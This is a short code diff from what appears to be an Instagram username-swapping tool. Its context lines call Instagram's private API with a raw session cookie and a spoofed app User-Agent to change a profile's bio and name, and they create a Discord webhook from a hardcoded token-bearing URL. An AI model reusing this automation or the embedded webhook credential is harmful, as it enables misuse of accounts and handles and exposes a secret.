@@ -422,7 +422,7 @@ class swap:
 
     def sucssfully_swap(self):
         self.run = False
-        inputc(True,"$",Design.red,f"{self.Msg} {Design.reda}@{self.Target}")
+        print("\n");inputc(True,"$",Design.red,f"{self.Msg} {Design.reda}@{self.Target}\n")
         self.REQ.post('https://i.instagram.com/api/v1/accounts/set_biography/', data={"raw_text": f"{self.bio}"},headers={"User-Agent": "Instagram 152.0.0.1.60 Android", "Cookie": "sessionid=" + self.session})
         self.REQ.post("https://i.instagram.com/api/v1/accounts/set_phone_and_name/",data={"first_name":f"{self.name}"},headers={"User-Agent": "Instagram 152.0.0.1.60 Android","Cookie": "sessionid=" + self.session})
         webhook = DiscordWebhook(url='https://discord.com/api/webhooks/899788444966985730/Uy9-NNXthTA3ncdGqNSTfteDFZYcWASapaKaJObTMr_fuIxJ7dIkzcLtDMT8OOURuJIr')
